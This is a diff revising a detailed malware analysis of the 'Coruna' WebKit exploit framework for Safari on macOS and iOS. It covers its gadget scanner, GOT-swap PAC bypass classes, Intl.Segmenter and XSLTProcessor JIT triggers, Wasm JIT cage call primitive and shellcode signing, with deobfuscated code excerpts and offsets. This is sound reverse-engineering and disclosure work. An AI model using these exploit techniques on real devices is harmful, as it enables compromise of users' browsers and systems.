 **eOWEVG "Enhanced" variant**: The `macos_stage2_eOWEVG` module is 5,045 bytes larger than `agTkHY` because it sets five additional `T.Dn` properties after trigger execution:
 
@@ -2706,7 +2744,7 @@ HTML page load (b27.icu)
   │
   ├─ <script> macos_stage2_eOWEVG_55afb1a6.js   (or agTkHY variant)
   │    └─ r.Mh()
-  │       ├─ new Intl.Segmenter("en", {nu:"currency"})
+  │       ├─ new Intl.Segmenter("en", {nu:"sentence"})
   │       ├─ Uses T.Dn.Pn + T.Dn.En for gadget-based PAC bypass
   │       ├─ [eOWEVG only] Sets T.Dn.On, .Wn, .Nn, .Vh, .$h
   │       └─ Code execution via JIT page W^X bypass
@@ -2825,8 +2863,8 @@ The offsets shift by 1024 bytes between 17.0→17.1 and by 40 bytes between 17.1
 ```
 if (T.Dn.dn >= 170100)      → path for Safari 17.1+
   else if (T.Dn.dn >= 170000) → path for Safari 17.0
-  else if (T.Dn.dn >= 160400) → path for Safari 16.4–16.x
-  else if (T.Dn.dn >= 160000) → path for Safari 16.0–16.3
+  else if (T.Dn.dn >= 160400) → path for Safari 16.4-16.x
+  else if (T.Dn.dn >= 160000) → path for Safari 16.0-16.3
 ```
 
 Each tier selects a different target library function (resolved via XOR-encoded strings) and a different constant `k` value. The cascade appears twice in each payload - once for the primary code pointer resolution (`F`/`L` variable) and once for the secondary data pointer (`S`/`s` variable), with matching `DA` objects constructed from XOR-decoded offset pairs.
@@ -2850,7 +2888,7 @@ The distribution of `Hn` property consumption is highly asymmetric. The two macO
 
 Several patterns emerge from this distribution:
 
-**1. Platform exclusivity.** The 22–23 properties consumed by the macOS Stage 2 modules are entirely disjoint from those consumed by `ios_qeqLdN`. This confirms that the `Hn` table encodes platform-specific structure layouts - macOS and iOS kernel/WebKit internals use different field offsets even on the same ARM64 architecture, reflecting differences in KTRR, PPL, and zone allocator implementations between the two operating systems.
+**1. Platform exclusivity.** The 22-23 properties consumed by the macOS Stage 2 modules are entirely disjoint from those consumed by `ios_qeqLdN`. This confirms that the `Hn` table encodes platform-specific structure layouts - macOS and iOS kernel/WebKit internals use different field offsets even on the same ARM64 architecture, reflecting differences in KTRR, PPL, and zone allocator implementations between the two operating systems.
 
 **2. Shared `.kr` provider offsets.** Five properties - `QvkVI6`, `fieNdh`, `hXqDfP`, `iiExAt`, and `Dyzpbm` - are shared across the primitive-building modules `yAerzw`, `YGPUu7`, and `Fq2t1Q`. These modules all export `.kr` interfaces (the `ArrayBuffer` corruption primitive), suggesting these five offsets target the same JSC structures (`ArrayBuffer` backing store pointer, butterfly pointer, JSCell header fields) that must be corrupted regardless of which vulnerability triggers the initial type confusion.
 
@@ -2946,14 +2984,14 @@ The scanner uses seven ARM64 instruction encoding constants, each paired with a 
 | `0xd65f0fff` | exact | **RETAB** | PAC B-key authenticated return - chain terminator |
 | `0xd4200020` | exact | **BRK #1** | Software breakpoint - used as scan boundary |
 
-The mask `0x9f00001f` is dynamically computed for ADRP instructions to preserve only the destination register field (bits 0–4) and the opcode identifier, allowing the scanner to track which register receives the page address.
+The mask `0x9f00001f` is dynamically computed for ADRP instructions to preserve only the destination register field (bits 0-4) and the opcode identifier, allowing the scanner to track which register receives the page address.
 
 #### 6.1.2 The `Nl()` Pattern Matcher
 
 The `Nl(address, pattern, followBranches)` method takes a starting address, an array of expected instruction words, and a boolean controlling whether unconditional branches should be followed. Its algorithm:
 
 1. **Compute masks dynamically.** For each instruction in the pattern array, `Nl()` determines the appropriate mask based on the opcode:
-   - ADRP (`0x90000000` in bits 31, 28–24): mask = `0x9f00001f` (preserve opcode + destination register only)
+   - ADRP (`0x90000000` in bits 31, 28-24): mask = `0x9f00001f` (preserve opcode + destination register only)
    - LDR following an ADRP: mask = `0xffc003ff` (preserve opcode + both register fields, ignore offset)
    - B/BL (`0x14000000` or `0x94000000`): mask = `0xfc000000` (opcode only, ignore 26-bit offset)
    - All other instructions: mask = `0xffffffff` (exact match required)
@@ -3025,7 +3063,7 @@ This method is used by `ec()` to discover what functions a candidate gadget call
 
 #### 6.2.5 `Ml(address, maxBytes, stopInstruction)` - ROP Chain Builder
 
-The most complex method in the scanner. `Ml()` performs **abstract interpretation** of an ARM64 instruction sequence, tracking register state across ADRP + LDR pairs to resolve the addresses loaded by the code. It simulates a 32-element register file (x0–x31) and collects resolved pointer values:
+The most complex method in the scanner. `Ml()` performs **abstract interpretation** of an ARM64 instruction sequence, tracking register state across ADRP + LDR pairs to resolve the addresses loaded by the code. It simulates a 32-element register file (x0-x31) and collects resolved pointer values:
 
 ```
 Ml(address, maxBytes=768, stopInstruction=null):
@@ -3100,7 +3138,7 @@ Both methods iterate over the same four Mach-O sections (`__AUTH`, `__AUTH_CONST
 
 ### 6.3 The `er` Class - Anchor Symbol Resolution Table
 
-Class `er` provides a **lazy-evaluated resolution table** of 26 named properties, each resolving to a specific function pointer or code address in the dyld shared cache. The class is implemented as a JavaScript `Proxy` - accessing any property triggers on-demand resolution via the corresponding method in the `Xl()` dispatch table, with results cached in `this.Vl` for subsequent accesses:
+Class `er` provides a **lazy-evaluated resolution table** of 28 named properties, each resolving to a specific function pointer or code address in the dyld shared cache. The class is implemented as a JavaScript `Proxy` - accessing any property triggers on-demand resolution via the corresponding method in the `Xl()` dispatch table, with results cached in `this.Vl` for subsequent accesses:
 
 ```javascript
 class er {
@@ -3124,14 +3162,15 @@ The anchor symbols span **10 distinct system libraries and frameworks**, reveali
 |-------------|-----------------|------|
 | `libxml2.2.dylib` | `Zl` (`_xmlSAX2GetPublicId`), `za` (`_xmlHashScanFull`), `mc` (`_xmlMalloc`) | XML parsing library - used as GOT anchor; provides known symbol addresses for cross-referencing |
 | `/usr/lib/libobjc.A.dylib` | `ql`, `$l`, `Ql`, `Ka` (all via `Bl()`) | Objective-C runtime - source of authenticated pointers to ObjC method implementations |
-| `CloudKit.framework` | `ql`, `$l`, `Ql`, `Ka`, `qa`, `Ya`, `Qa` (as cross-ref target) | Large framework with numerous vtable entries - cross-referenced from libobjc to locate specific method implementations |
+| `CloudKit.framework` | `qa`, `Ya`, `Qa`, `Xa` (as cross-ref target) | Large framework with numerous vtable entries - cross-referenced from libobjc to locate specific method implementations |
 | `UIKitCore.framework` | `rc`, `Qa` (as cross-ref target) | UI framework - contains Objective-C class implementations used as gadget sources |
-| `JavaScriptCore.framework` | `_c` (the image itself), `uc` (`_jitCagePtr`), `dc` (`JSC::LinkBuffer::linkCode`) | JSC internals - critical for JIT cage escape |
+| `JavaScriptCore.framework` | `_c` (the image itself), `xc` (`WTF::fastMalloc`), `uc` (`_jitCagePtr`), `dc` (`JSC::LinkBuffer::linkCode`) | JSC internals - critical for JIT cage escape |
 | `Foundation.framework` | `nc` (`_OBJC_CLASS_$_NSUUID`) | Foundation class used as a known data structure anchor |
 | `CoreMedia.framework` | `tc` (`_EdgeInfoCFArrayReleaseCallBack`) | Media framework - provides an authenticated callback pointer |
 | `ActionKit.framework` | `fc` (`_dlfcn_globallookup`) | Private framework - contains the dynamic linker lookup function |
-| `CoreUtils.framework` | `Ql` (via `Bl()` cross-ref) | Private utility framework |
-| `CoreGraphics.framework` | `Ka` (via `Bl()` cross-ref) | Graphics framework |
+| `CoreUtils.framework` | `$l` (via `Bl()` cross-ref) | Private utility framework |
+| `CoreGraphics.framework` | `Ql`, `Ka` (via `Bl()` cross-ref) | Graphics framework |
+| `RESync.framework` | `ql` (via `Bl()` cross-ref) | Private framework - cross-referenced from libobjc to locate gadget |
 
 Additionally, three libraries are resolved purely for their utility function symbols, without scanning for gadgets:
 
@@ -3139,7 +3178,7 @@ Additionally, three libraries are resolved purely for their utility function sym
 |-------------|---------|---------|
 | `libsystem_platform.dylib` | `hc` (`__platform_memset`), `wc` (`__platform_memmove`) | Memory operations for shellcode staging |
 | `libsystem_malloc.dylib` | `bc` (`_malloc`), `yc` (`_free`) | Heap allocation for exploit data structures |
-| `libsystem_c.dylib` | `xc` (`WTF::fastMalloc`) | WebKit's custom allocator |
+| `libsystem_c.dylib` | (no exploit symbols) | Not directly used for symbol resolution |
 
 #### 6.3.2 Resolution Methods by Category
 
@@ -3157,9 +3196,9 @@ This is the simplest case: the symbol exists in libxml2's export trie, and `Ul()
 
 | Property | Symbol | Target Library | Pattern Length |
 |----------|--------|---------------|----------------|
-| `ql` | `enet_allocate_packet_payload_default` | libobjc → CloudKit | 18 instructions |
-| `$l` | `_HTTPConnectionFinalize` | libobjc → RESync | 10 instructions |
-| `Ql` | `_autohinter_iterator_begin` | libobjc → CoreUtils | 7 instructions |
+| `ql` | `enet_allocate_packet_payload_default` | libobjc → RESync | 18 instructions |
+| `$l` | `_HTTPConnectionFinalize` | libobjc → CoreUtils | 10 instructions |
+| `Ql` | `_autohinter_iterator_begin` | libobjc → CoreGraphics | 7 instructions |
 | `Ka` | `_autohinter_iterator_end` | libobjc → CoreGraphics | 7 instructions |
 | `tc` | `_EdgeInfoCFArrayReleaseCallBack` | libobjc → CoreMedia | 21 instructions |
 | `fc` | `_dlfcn_globallookup` | libobjc → ActionKit | 19 instructions |
@@ -3191,7 +3230,7 @@ Each `Bl()` call supplies an `Ol` array containing the expected instruction patt
 | `uc` | `kl()` trie lookup | `_jitCagePtr` in JSC |
 | `mc` | `kl()` trie lookup | `_xmlMalloc` in libxml2 |
 | `dc` | `kl()` trie lookup | `JSC::LinkBuffer::linkCode` (mangled) in JSC |
-| `xc` | `kl()` trie lookup | `WTF::fastMalloc` (mangled) in libsystem |
+| `xc` | `kl()` trie lookup | `WTF::fastMalloc` (mangled) in JavaScriptCore |
 
 #### 6.3.3 The `ec()` Complex Resolution - Iterative Gadget Discovery
 
@@ -3212,7 +3251,7 @@ The resolved anchor symbols flow from the `er` class (stored as `T.Dn.En.nl`) to
 
 The two macOS Stage 2 modules are the primary consumers of gadget-scanned addresses. Their consumption patterns differ in scope:
 
-**`macos_stage2_eOWEVG`** (33 `En` references) accesses 21 distinct anchor symbols - nearly the entire `er` table:
+**`macos_stage2_eOWEVG`** (~28 `En` references) accesses 23 distinct anchor symbols - nearly the entire `er` table:
 
 | Symbol Category | Properties Accessed | Purpose |
 |----------------|--------------------| ------- |
@@ -3220,12 +3259,12 @@ The two macOS Stage 2 modules are the primary consumers of gadget-scanned addres
 | Derived GOT pointers | `Yl` (×6), `Wl` (×6) | Function pointers extracted from `ql`'s prologue - used as ROP chain targets |
 | Cross-library gadgets | `Za` (×3), `Qa` (×3), `rc`, `Ya`, `qa` | Validated code pointers for JOP dispatch |
 | Memory primitives | `hc`, `wc`, `bc`, `yc` | `memset`, `memmove`, `malloc`, `free` - shellcode staging |
-| JSC internals | `uc`, `dc`, `nc`, `mc`, `tc` | JIT cage pointer, `LinkBuffer::linkCode`, NSUUID class, `xmlMalloc`, callback pointer |
+| JSC internals | `uc`, `xc`, `nc`, `mc`, `tc` | JIT cage pointer, `WTF::fastMalloc`, NSUUID class, `xmlMalloc`, callback pointer |
 | Secondary image | `ec`, `oc` | Anonymous function from alternate Mach-O image |
 
 The `Yl` and `Wl` properties dominate with 6 references each - these GOT-derived pointers are used repeatedly as the primary ROP chain targets, likely serving as the gadget entry points for the PAC bypass and privilege escalation sequences.
 
-**`macos_stage2_agTkHY`** (20 `En` references) accesses a smaller but overlapping subset:
+**`macos_stage2_agTkHY`** (~10 `En` references) accesses a smaller but overlapping subset:
 
 | Symbol Category | Properties Accessed | Purpose |
 |----------------|--------------------| ------- |
@@ -3562,13 +3601,13 @@ class ia {
     constructor() {
         const t = T.Dn.En, a = T.Dn.Pn;
         this.En = {
-            Zl: t.nl.Zl,    // GOT entry: _dlfcn_globallookup
-            ql: t.nl.ql,     // GOT entry: _autohinter_iterator_begin
+            Zl: t.nl.Zl,    // GOT entry: _xmlSAX2GetPublicId
+            ql: t.nl.ql,     // GOT entry: enet_allocate_packet_payload_default
             Yl: t.nl.Yl,     // GOT pointer A (derived from ql prologue)
             Wl: t.nl.Wl,     // GOT pointer B (derived from ql prologue)
             $l: t.nl.$l,     // GOT entry: _HTTPConnectionFinalize
-            Ql: t.nl.Ql,     // GOT entry: _xmlSAX2GetPublicId
-            Ka: t.nl.Ka      // Dispatch target: ActionKit callback
+            Ql: t.nl.Ql,     // GOT entry: _autohinter_iterator_begin
+            Ka: t.nl.Ka      // GOT entry: _autohinter_iterator_end
         };
         this.Uh = a.pa(80);   // 80-byte fake structure 1
         this.jh = a.pa(80);   // 80-byte fake structure 2
@@ -3580,7 +3619,7 @@ class ia {
 }
 ```
 
-Seven of the 26 anchor symbols from Section 6.3 are consumed here. The `Yl` and `Wl` entries - the two most heavily referenced symbols (6× each in `eOWEVG`) - are the **GOT entries that get swapped**.
+Seven of the 28 anchor symbols from Section 6.3 are consumed here. The `Yl` and `Wl` entries - the two most heavily referenced symbols (6× each in `eOWEVG`) - are the **GOT entries that get swapped**.
 
 #### 7.4.2 `call(t)` - The GOT-Swap-and-Trigger Sequence
 
@@ -3598,7 +3637,7 @@ call(t) {
             [48, this.Rh]               // offset 48: fake vtable
         ]],
         [this.Dh, [                     // Result buffer
-            [16, 0x1BC5A9ABBn]          // magic sentinel value
+            [16, 0x1BBBBBBBBn]         // magic sentinel value
         ]],
         [this.Rh, [                     // Fake vtable (768 bytes)
             [64, 0], [24, 0],           // padding
@@ -3606,7 +3645,7 @@ call(t) {
             [offset_Ql, this.En.Ql],    // xmlSAX2GetPublicId pointer
             [offset_x1, t.x1],          // caller's target address
             [offset_Uh, this.Uh],       // pointer to fake structure 1
-            [offset_magic, 0x3B53DB3Fn] // dispatch constant
+            [offset_magic, 0x1CCCCCCCn] // dispatch constant
         ]],
         [this.Uh, [                     // Fake structure 1
             [16, t._h],                 // offset 16: PAC signing context
@@ -3675,7 +3714,7 @@ class ca {
     constructor() {
         const a = T.Dn.Pn;
         const seg = new Intl.Segmenter("en", {
-            nu: "currency"   // XOR-decoded from [68,82,89,67,82,89,84,82] ^ 55
+            nu: "sentence"   // XOR-decoded from [68,82,89,67,82,89,84,82] ^ 55
         });
 
         const words = [];
@@ -3692,7 +3731,7 @@ class ca {
 }
 ```
 
-The constructor creates an `Intl.Segmenter` with a non-standard `nu` (numbering system) option set to `"currency"`. This is not a valid ICU numbering system - it is specifically chosen to trigger a **code path in WebKit's ICU integration** that leads to JIT compilation of the segmentation logic. The 300-word input string ensures the JIT compiler considers the path hot enough to compile.
+The constructor creates an `Intl.Segmenter` with a non-standard `nu` (numbering system) option set to `"sentence"`. This is not a valid ICU numbering system - it triggers a **code path in WebKit's ICU integration** that leads to JIT compilation of the segmentation logic. The 300-word input string ensures the JIT compiler considers the path hot enough to compile.
 
 The `this.Jb` buffer is allocated with a size read from `T.Dn.Hn.IMuONj` - a server-provided offset that varies by target version, ensuring the buffer matches the JIT code's expected layout.
 
@@ -3774,7 +3813,7 @@ The exploit clones the JIT code's internal method table into a new allocation, t
 
 #### 7.5.3 The `agTkHY` Variant
 
-The `agTkHY` variant's `ca` class is structurally identical - same `Intl.Segmenter` setup with `nu: "currency"`, same 300-word warm-up, same JIT structure navigation. The only differences are the XOR keys used in string encoding and minor offset variations handled by the `Hn` table.
+The `agTkHY` variant's `ca` class is structurally identical - same `Intl.Segmenter` setup with `nu: "sentence"`, same 300-word warm-up, same JIT structure navigation. The only differences are the XOR keys used in string encoding and minor offset variations handled by the `Hn` table.
 
 ### 7.6 ObjC PAC Signing Chain - Classes `sa`, `at`, `it`
 
@@ -3873,7 +3912,7 @@ class it {
         this.En = {
             Zl: t.nl.Zl,   ql: t.nl.ql,
             Yl: t.nl.Yl,   Wl: t.nl.Wl,
-            $l: t.nl.$l,   tc: t.nl.tc,   // _xmlMalloc (instead of Ql)
+            $l: t.nl.$l,   tc: t.nl.tc,   // _EdgeInfoCFArrayReleaseCallBack (instead of Ql)
             Ka: t.nl.Ka
         };
         // ... allocate scratch buffers, create ca() trigger ...
@@ -3883,7 +3922,7 @@ class it {
 }
 ```
 
-The key difference from Class `ia`: `it` uses `tc` (`_xmlMalloc`) instead of `Ql` (`_xmlSAX2GetPublicId`) in the fake vtable, and it dynamically allocates a 0x120-byte buffer via `st.call()` for each invocation. The call flow is identical - swap `Yl`/`Wl` GOT entries, trigger via `ca.call()`, restore in `finally`.
+The key difference from Class `ia`: `it` uses `tc` (`_EdgeInfoCFArrayReleaseCallBack`) instead of `Ql` (`_xmlSAX2GetPublicId`) in the fake vtable, and it dynamically allocates a 0x120-byte buffer via `st.call()` for each invocation. The call flow is identical - swap `Yl`/`Wl` GOT entries, trigger via `ca.call()`, restore in `finally`.
 
 #### 7.6.4 The Complete Signing Flow
 
@@ -3975,7 +4014,7 @@ call(t, a) {
                         + a.length);
 ```
 
-The error message (XOR-decoded with key `121`) confirms the design intent - this is explicitly a "Wasm JIT Cage Call Primitive" limited to 8 register-width arguments, matching the ARM64 calling convention's 8 general-purpose argument registers (`x0`–`x7`).
+The error message (XOR-decoded with key `121`) confirms the design intent - this is explicitly a "Wasm JIT Cage Call Primitive" limited to 8 register-width arguments, matching the ARM64 calling convention's 8 general-purpose argument registers (`x0`-`x7`).
 
 **Step 1 - Load Arguments:**
 
@@ -4023,7 +4062,7 @@ The execution sequence:
 
 1. `s.zi(c, n)` writes the swapped pointer into the JIT cage dispatch slot
 2. `this.sf(...this.rf)` calls the Wasm export `f` with 16 `i32` arguments (the 8 `BigInt64` values split into hi/lo halves)
-3. The Wasm JIT cage dispatcher reads the modified `_jitCagePtr`, follows it to the attacker-supplied address `t`, and executes arbitrary native code with the 8 argument values in registers `x0`–`x7`
+3. The Wasm JIT cage dispatcher reads the modified `_jitCagePtr`, follows it to the attacker-supplied address `t`, and executes arbitrary native code with the 8 argument values in registers `x0`-`x7`
 4. The return value lands in Wasm memory `m`, read back as two `Uint32` halves via `this.cf[0]` and `this.cf[1]`, then reassembled into a single `BigUint64` result
 
 The `finally` block unconditionally restores the original JIT page pointer via `s.zi(c, h)`, ensuring the Wasm JIT cage returns to its legitimate state even if the native call faults.
@@ -4181,7 +4220,7 @@ All roads lead back to class `ta` as the root dependency. Without the PAC engine
 
 ### 7.9 Fallback PAC Bypass - The XSLTProcessor Path (`fallback_2d2c721e.js`)
 
-Sections 7.1–7.8 documented the PAC bypass architecture as implemented in the two stage-2 variants (`macos_stage2_eOWEVG` and `macos_stage2_agTkHY`). However, the Coruna framework includes an entirely separate PAC bypass implementation in `fallback_2d2c721e.js` - a self-contained module that provides the same four signing primitives (`sc`, `oe`, `cc`, `ac`) through a different code path. This fallback module uses **XSLTProcessor's `transformToDocument()`** as its JIT trigger mechanism (with an `Intl.Segmenter` alternative), replacing the `Intl.Segmenter`-only approach of the main stage-2 variants.
+Sections 7.1-7.8 documented the PAC bypass architecture as implemented in the two stage-2 variants (`macos_stage2_eOWEVG` and `macos_stage2_agTkHY`). However, the Coruna framework includes an entirely separate PAC bypass implementation in `fallback_2d2c721e.js` - a self-contained module that provides the same four signing primitives (`sc`, `oe`, `cc`, `ac`) through a different code path. This fallback module uses **XSLTProcessor's `transformToDocument()`** as its JIT trigger mechanism (with an `Intl.Segmenter` alternative), replacing the `Intl.Segmenter`-only approach of the main stage-2 variants.
 
 The fallback module is loaded via `globalThis.vKTo89.tI4mjA()` - the same module registration system used throughout the framework - and exports a factory function `r.Mh` that returns a new instance of class `ci`, the main exploit chain controller.
 
@@ -4203,17 +4242,17 @@ These are exported as `r.ie` (primary parser) and `r.Xs` (helper). This layer gi
 
 | Class | Role | Offset Range |
 |-------|------|-------------|
-| `ii` | Stub base class - defines the 4-method signing interface | 13190–13375 |
-| `ti` | ARM64 Mach-O gadget scanner - pattern matching + ADRP/LDR chain resolver | 13375–18439 |
-| `ci` | Main controller - extends `ii`, selects chain variant, builds JOP structures | 18439–25676 |
-| `li` | Intl.Segmenter chain variant - Segmenter-triggered GOT-swap dispatch | 25676–29360 |
-| `si` | XSLTProcessor chain variant - XSLT-triggered GOT-swap dispatch | 29360–34157 |
-| `hi` | XSLTProcessor controller - manages the XSLT stylesheet and trigger | 34157–36093 |
+| `ii` | Stub base class - defines the 4-method signing interface | 13190-13375 |
+| `ti` | ARM64 Mach-O gadget scanner - pattern matching + ADRP/LDR chain resolver | 13375-18439 |
+| `ci` | Main controller - extends `ii`, selects chain variant, builds JOP structures | 18439-25676 |
+| `li` | Intl.Segmenter chain variant - Segmenter-triggered GOT-swap dispatch | 25676-29360 |
+| `si` | XSLTProcessor chain variant - XSLT-triggered GOT-swap dispatch | 29360-34157 |
+| `hi` | XSLTProcessor controller - manages the XSLT stylesheet and trigger | 34157-36092 |
 
-The module concludes with:
+The standalone assignment `r.Kc = ii` (at offset 13367, between class `ii` and class `ti`) exports the base signing interface for `instanceof` checks. The module concludes with:
 
 ```javascript
-return r.Kc = ii, r.Mh = function(){ return new ci }, r;
+return r.Mh = function(){ return new ci }, r;
 ```
 
 #### 7.9.2 Class `hi` - XSLTProcessor Controller
@@ -4260,6 +4299,21 @@ The `sh()` method is the JIT trigger - a zero-argument function that, when calle
 ```
 
 The warmup replaces `{@foo}` with the literal string `foo`, creating a valid `data-type="foo"` that does *not* trigger the AVT evaluation path. This ensures WebKit's XSLT JIT infrastructure is fully initialized (code pages allocated, inline caches populated) before the exploit attempts to hijack the error path.
+
+**Minimal Stylesheet Warmup Method `Th()`:**
+
+```javascript
+  Th() {
+    const t = new XSLTProcessor;
+    const c = new DOMParser().parseFromString(
+      '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"></xsl:stylesheet>',
+      'text/xml');
+    t.importStylesheet(c);
+    t.transformToDocument(this.ph);
+  }
+```
+
+`Th()` provides a second warmup path using an empty XSLT stylesheet - no `xsl:sort`, no AVT trigger, just a minimal `transformToDocument` call. This initializes the base XSLT transform infrastructure without exercising any of the sort or attribute-value-template code paths.
 
 **Initialization Method `ah()`:**
 
@@ -4500,11 +4554,11 @@ It then locates the WebCore framework and resolves sections within it:
 
     // Resolve xsltFreeTransformContext and xsltTransformError
     const xsltFreeCtx = l.fo('xsltFreeTransformContext');
-    this.bh = /* section lookup for xsltTransformError */;
-    this.$c = /* section lookup for xsltFreeTransformContext */;
+    this.bh = /* section lookup for xsltFreeTransformContext */;
+    this.$c = /* section lookup for xsltTransformError */;
 ```
 
-The constructor resolves two critical `libxslt` symbols: `xsltTransformError` (stored as `this.bh`) is the function whose GOT entry will be hijacked to redirect execution, and `xsltFreeTransformContext` (stored as `this.$c`) provides the cleanup GOT entry. The `this.lh` field is set to `this.$c - 24` and verified to contain the value `1` - a sanity check confirming the correct memory layout.
+The constructor resolves two critical `libxslt` symbols: `xsltFreeTransformContext` (stored as `this.bh`) provides the cleanup GOT entry, and `xsltTransformError` (stored as `this.$c`) is the function whose GOT entry will be hijacked to redirect execution. The `this.lh` field is set to `this.$c - 24` and verified to contain the value `1` - a sanity check confirming the correct memory layout.
 
 **Step 6 - Build JOP Dispatch Structure (`Jc()`):**
 
@@ -4517,7 +4571,7 @@ The `Jc()` method constructs the JOP dispatch table within `this.Oc`. It writes 
     const c = K.Vt.ut(t).Ut();         // Convert to 64-bit pointer
 
     i[0]  = 0xFEEDFACF;               // Magic (Mach-O 64-bit header)
-    i[4]  = 3;                         // CPU type: ARM64
+    i[4]  = 3;                         // ncmds: 3 load commands
     i[8]  = 25;                        // ... additional JOP table entries
     // ... ~30 more indexed writes building the dispatch structure
     return i;
@@ -4550,7 +4604,7 @@ Both methods use `T.Dn.Pn.Pr()` with multiple `{Sr, Zt}` (swap-restore) pairs - 
 
 #### 7.9.5 Class `li` - Intl.Segmenter Chain Variant
 
-Class `li` is instantiated when the `rlZW0r` configuration flag is `true`. It provides the same GOT-swap-and-trigger architecture as the main stage-2's `ca`/`ia` classes (Sections 7.4–7.5), but reimplemented within the fallback module's independent class hierarchy.
+Class `li` is instantiated when the `rlZW0r` configuration flag is `true`. It provides the same GOT-swap-and-trigger architecture as the main stage-2's `ca`/`ia` classes (Sections 7.4-7.5), but reimplemented within the fallback module's independent class hierarchy.
 
 **Constructor - Gadget Discovery:**
 
@@ -4563,7 +4617,7 @@ class li {
           c = i.dh,              // Gadget scanner (class ti)
           l = i.controller;      // XSLTProcessor controller (class hi)
 
-    this.oh = new ArrayBuffer(224);   // Shared data buffer
+    this.oh = new ArrayBuffer(288);   // Shared data buffer
     K.D(this.oh);                     // Pin in memory
     this.eh = t.Ar(this.oh);          // Native address of buffer
 ```
@@ -4658,7 +4712,7 @@ class si {
   constructor(i) {
     const t = T.Dn.Pn, c = i.dh, l = i.controller;
 
-    this.oh = new ArrayBuffer(224);
+    this.oh = new ArrayBuffer(288);
     K.D(this.oh);
     this.eh = t.Ar(this.oh);
 ```
@@ -4782,7 +4836,7 @@ The Coruna PAC bypass is not a single exploit primitive but a *cooperating syste
 | `aa` | stage-2 | *(returned)* | Public façade wrapping `ta` |
 | `ha` | stage-2 | `T.Dn.Nn` (as `t.Nn`) | Native call primitive - `call({_h, xh, x1, x2})` dispatch |
 | `ia` | stage-2 | *(per-instance)* | 7-anchor GOT-swap dispatcher - swap/trigger/restore |
-| `ca` | stage-2 | *(per-instance)* | `Intl.Segmenter` JIT trigger - `nu:"currency"` warmup + `iter.next().value` |
+| `ca` | stage-2 | *(per-instance)* | `Intl.Segmenter` JIT trigger - `nu:"sentence"` warmup + `iter.next().value` |
 | `sa` | stage-2 | *(per-instance)* | ObjC PAC signer - NSUUID `getUUIDBytes:` GOT swap |
 | `at` | stage-2 | *(per-instance)* | ObjC message sender - `objc_msgSend` dispatch via GOT swap |
 | `it` | stage-2 | *(per-instance)* | Inner GOT-swap caller - nested swap within `sa`'s chain |
@@ -4822,7 +4876,7 @@ JavaScript caller
 
 Every PAC bypass operation follows the same four-phase pattern, whether in the main stage-2 or the fallback module:
 
-1. **Save** - Read and store the current value of 1–7 GOT entries
+1. **Save** - Read and store the current value of 1-7 GOT entries
 2. **Swap** - Write attacker-controlled values (gadget addresses, buffer pointers) into the GOT slots
 3. **Trigger** - Call a legitimate WebKit function (`Intl.Segmenter.prototype[Symbol.iterator]().next()`, or `XSLTProcessor.transformToDocument()`) that reads the swapped GOT entries during its normal execution
 4. **Restore** - In a `finally` block, unconditionally write back the saved original values
@@ -4851,14 +4905,14 @@ Each final payload file is a single-line minified JavaScript blob (~137KB for va
 let r = {};
 globalThis.vKTo89.tI4mjA(
     '<XOR-obfuscated hash ID>',
-    '<Base64-encoded inner module - 37,838 / 62,770 chars>'
+    '<Base64-encoded inner module - 37,836 / 62,768 chars>'
 );
 ```
 
 | Variant | Registration Hash | Inner Module Size |
 |---------|------------------|-------------------|
-| A | `356d2282845eafd8cf1ee2fbb2025044678d0108` | 37,838 chars Base64 |
-| B | `7861d5490d7bf5ab22539b5e32f86fd77d53d85b` | 62,770 chars Base64 |
+| A | `356d2282845eafd8cf1ee2fbb2025044678d0108` | 37,836 chars Base64 |
+| B | `7861d5490d7bf5ab22539b5e32f86fd77d53d85b` | 62,768 chars Base64 |
 
 The Base64 blob decodes to the inner module JavaScript, which itself contains another `tI4mjA()` call - creating recursive nesting where the outer hash registers the inner module under its own hash.
 
@@ -4869,9 +4923,9 @@ After the `tI4mjA()` registration, the outer wrapper contains the exploit orches
 | Component | Purpose |
 |-----------|---------|
 | Class `DA` | 64-bit integer arithmetic (high/low 32-bit word operations) |
-| Function `CA()` | Constructs a binary payload from Base64 blob #1 (~41,746 chars - shellcode/ROP data) |
+| Function `CA()` | Constructs a binary payload from Base64 blob #1 (~41,744 chars - shellcode/ROP data) |
 | Class `YA` | Builds the final exploit payload structure with all resolved addresses |
-| Function `xA()` | C2 communication state machine over `SharedArrayBuffer` + XHR |
+| Function `xA()` | C2 communication state machine over `ArrayBuffer` + XHR |
 | Function `yA()` | Main entry - assembles payload, resolves addresses, writes shellcode, triggers execution |
 | Entry `r.lA` | Module export - calls `A.Zg()` → `A.Sg()` → `yA()` |
 
@@ -4888,7 +4942,7 @@ The inner module contains the Mach-O parsing and JIT code upload engine:
 | `et` | Binary offset calculator / segment parser |
 | `nt` | Dyld image list enumerator with symbol search |
 
-Both A and B variants share this identical class hierarchy. The key difference is the ARM64 shellcode payload embedded as XOR-encoded `Uint32Array` dwords (~88 dwords in A, 27–44 in B).
+Both A and B variants share this identical class hierarchy. The key difference is the ARM64 shellcode payload embedded as XOR-encoded `Uint32Array` dwords (~88 dwords in A, 27-44 in B).
 
 ### 8.2 Symbol Resolution and Capability Detection (Class `hc`)
 
@@ -5005,7 +5059,7 @@ const sign = (code, offset, dest) => {
 
 The algorithm's key properties:
 
-1. **PAC as a MAC** - Each `lc.cc()` call invokes the hardware PACDB instruction, which produces a cryptographically strong 16–25 bit authentication code using the processor's secret PAC key. By using PAC as a keyed hash function rather than for pointer authentication, the exploit leverages the same hardware primitive that protects code pointers to instead *sign* arbitrary code.
+1. **PAC as a MAC** - Each `lc.cc()` call invokes the hardware PACDB instruction, which produces a cryptographically strong 16-25 bit authentication code using the processor's secret PAC key. By using PAC as a keyed hash function rather than for pointer authentication, the exploit leverages the same hardware primitive that protects code pointers to instead *sign* arbitrary code.
 
 2. **Rolling dependency** - Each instruction's hash depends on all previous instructions' hashes (through the XOR chain). Modifying any single instruction invalidates all subsequent hash values, making partial code injection detectable.
 
@@ -5020,7 +5074,7 @@ The `Ig(c, a, l)` method copies shellcode into the allocated JIT page and valida
 ```javascript
 Ig(c, a, l) {
     // Step 1: PAC-sign the destination pointer
-    const o = lc.oe(dest, 0x3D96n);     // PACDB with context 0x3D96
+    const o = lc.oe(dest, 0x47EAn);     // PACDB with context 0x47EA
 
     // Step 2: Copy code via rg() (WASM trampoline)
     caller.rg(mg,                        // Code copy function address
@@ -5038,7 +5092,7 @@ Ig(c, a, l) {
 }
 ```
 
